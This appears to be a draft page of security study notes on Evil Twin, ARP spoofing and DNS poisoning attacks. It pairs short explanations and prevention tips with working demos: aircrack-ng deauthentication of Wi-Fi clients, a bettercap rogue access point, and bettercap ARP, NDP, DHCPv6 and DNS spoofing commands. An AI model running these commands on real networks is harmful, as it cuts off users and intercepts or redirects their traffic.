---
title: "Evil Twin - Draft"
weight: 500
date: 2024-06-15T01:47:46+07:00
---

# Evil Twin Attack

- A type of MitM attack
- Description: The attacker sets up a rogue Wi-Fi access point that mimics a legitimate network. Devices connect to it, allowing the attacker to intercept all traffic
- Key Characteristics:
    - The rogue network often has a similar name to the real network (e.g., "FreeWiFi")
    - Victims unknowingly connect to the attacker’s network
- Prevention:
    - Educate users to verify SSIDs before connecting
    - Enable **Mutual Authentication** on enterprise Wi-Fi setups

## Demo

{{<hint danger>}}
**DISCLAIMER**: This demo is for educational purposes only. The techniques should only be tested on systems you own or have explicit permission to analyze. Misuse of this information is unethical, may violate the law, and could lead to serious consequences. The author takes no responsibility for any damages or misuse arising from this content
{{</hint>}}

### Disconnect user from wifi

```sh
# Install the Aircrack-ng suite, which includes airmon-ng
sudo apt install aircrack-ng

# Check wireless interface
iwconfig
# -> E.g output
lo        no wireless extensions.
enp4s0    no wireless extensions.
wlo1      IEEE 802.11  ESSID:"A14-01"  
          Mode:Managed  Frequency:2.417 GHz  Access Point: CC:71:90:62:9E:98   
          Bit Rate=130 Mb/s   Tx-Power=22 dBm   
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
          Link Quality=62/70  Signal level=-48 dBm  
          Rx invalid nwid:0  Rx invalid crypt:0  Rx invalid frag:0
          Tx excessive retries:0  Invalid misc:203   Missed beacon:0
docker0   no wireless extensions.
# -> Your wireless interface is wlo1

# Disconnect the wireless adapter from managing a network
sudo airmon-ng check kill

# Enable monitor mode on your wireless adapter
sudo airmon-ng start wlo1

# Verify
iwconfig
# -> E.g output
lo        no wireless extensions.
enp4s0    no wireless extensions.
docker0   no wireless extensions.
wlo1mon   IEEE 802.11  Mode:Monitor  Frequency:2.457 GHz  
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:on
# -> Your wireless adapter with monitor mode is now wlo1mon

# Start capture packets
sudo airodump-ng wlo1mon

# Find the channel of wifi
sudo aireplay-ng --test wlo1mon
# E.g output
12:26:19  Trying broadcast probe requests...
12:26:21  No Answer...
12:26:21  Found 4 APs
12:26:21  Trying directed probe requests...
12:26:21  CC:71:90:62:9E:98 - channel: 2 - 'A14-01'
12:26:27   0/30:   0%
12:26:27  30:4F:75:8F:7F:28 - channel: 2 - 'Dinh Bao'
12:26:33   0/30:   0%
12:26:34  C0:B5:D7:89:36:70 - channel: 8 - 'Do Hai'
12:26:40   0/30:   0%
12:26:40  E8:43:68:6A:3B:88 - channel: 3 - 'Hoang Linh'
12:26:46   0/30:   0%
# -> We will taget 'A14-01' wifi, its channel is 2

# Stop the process capturing packets and start capture packets only on channel 2
sudo airodump-ng --channel 2 wlo1mon

# Deauthenticate target device from wifi by sending deauth packets
sudo aireplay-ng --deauth 100 -a [BSSID] -c [Client_MAC] wlo1mon
# E.g
sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 -c F2:2A:23:9E:54:E2 wlo1mon
# E.g output
12:24:18  Waiting for beacon frame (BSSID: CC:71:90:62:9E:98) on channel 2
12:24:18  Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|42 ACKs]
12:24:32  Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 0|326 ACKs]
12:24:33  Sending 64 directed DeAuth (code 7). STMAC: [F2:2A:23:9E:54:E2] [ 1|253 ACKs]
# Or omit to target all devices
sudo aireplay-ng --deauth 100 -a CC:71:90:62:9E:98 wlo1mon


```

- Stop capturing packets (exit monitor mode)
```sh
sudo airmon-ng stop wlo1mon
sudo systemctl restart NetworkManager
```

### Create the rogue access point

```sh
sudo apt update
sudo apt install bettercap


# Rogue access point
sudo bettercap -iface wlo1mon

# In bettercap:
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false
wifi.recon on; wifi.ap

```

# ARP spoofing attack

- ARP: Address Resolution Protocol
- A type of MitM attack

## How ARP Works
- ARP Basics:
    - ARP is used to map an IP address to a MAC address within a local network
    - When a device wants to communicate with another, it broadcasts an ARP request: "Who has IP 192.168.1.1? Tell me your MAC address."
    - The device with the corresponding IP replies with its MAC address
- Normal Communication:
    - Once ARP resolves the IP-to-MAC mapping, devices communicate directly using MAC addresses

## How ARP Spoofing Works
- The attacker sends forged ARP replies to the victim device and/or the router, claiming:
    - "I am the router (192.168.1.1)" to the victim
    - "I am the victim (192.168.1.100)" to the router
- Both the victim and the router update their ARP tables with the attacker's MAC address for the claimed IP
- As a result:
    - All traffic from the victim to the router (and vice versa) flows through the attacker
    - The attacker becomes a "man-in-the-middle" (MITM), able to intercept or modify traffic

## Diagram
Normal Traffic:
Victim → Router → Internet

ARP Spoofing:
Victim → Attacker → Router → Internet

## Prevention
- Static ARP Entries: Manually map critical IPs to MAC addresses to prevent changes
- Use Encryption: Secure protocols (e.g., HTTPS, SSH, VPN) ensure data confidentiality even if traffic is intercepted
- Enable Dynamic ARP Inspection (DAI): On managed switches, DAI verifies ARP packets against a trusted database

## Demo
```sh

# Fake dns
sudo bettercap -iface wlo1

# In bettercap:
net.probe on
net.show

set arp.spoof.targets 192.168.1.9
set dns.spoof.domains alo1411.team

arp.spoof on
# -> Output
[sys.log] [inf] arp.spoof arp spoofer started, probing 1 targets

dns.spoof on
# E.g output
[sys.log] [inf] dns.spoof alo1411.team -> 192.168.1.17

net.sniff
```


# DNS Poisoning

- A type of MitM attack


## Prevention

- Use Secure DNS: Configure DNS servers to use DNSSEC (Domain Name System Security Extensions), which adds cryptographic signatures to DNS records
- Enable HTTPS Everywhere: Even if DNS is poisoned, HTTPS with valid certificates will warn users when a site is untrusted
- Avoid Public Wi-Fi: Public networks are more susceptible to DNS poisoning attacks
- Set Trusted DNS Servers: Use reliable DNS resolvers like Google DNS (8.8.8.8) or Cloudflare (1.1.1.1)
- Monitor and Update Systems: Regularly patch DNS servers and network devices to address vulnerabilities
- Use a VPN: Encrypt traffic, bypassing rogue DNS responses on compromised networks

## Demo

```sh

set ndp.spoof.neighbour fe80::53a:d4db:13e9:b774
set ndp.spoof.targets 2001:ee0:4f51:2ed0:295c:1995:43bf:3e1b,2001:ee0:4f51:2ed0:c60d:3bd1:19b6:facb

2001:ee0:4f51:2ed0:ed4b:6d8:6bd0:b97f

set dns.spoof.domains mnptt.io.vn
set dns.spoof.address 192.168.1.17

set dhcp6.spoof.domains mnptt.io.vn

set arp.spoof.targets a4:34:d9:89:a0:58

ndp.spoof on
dhcp6.spoof on
dns.spoof on
arp.spoof on

```

## References

- Bettercap: [WiFi](https://www.bettercap.org/modules/wifi/)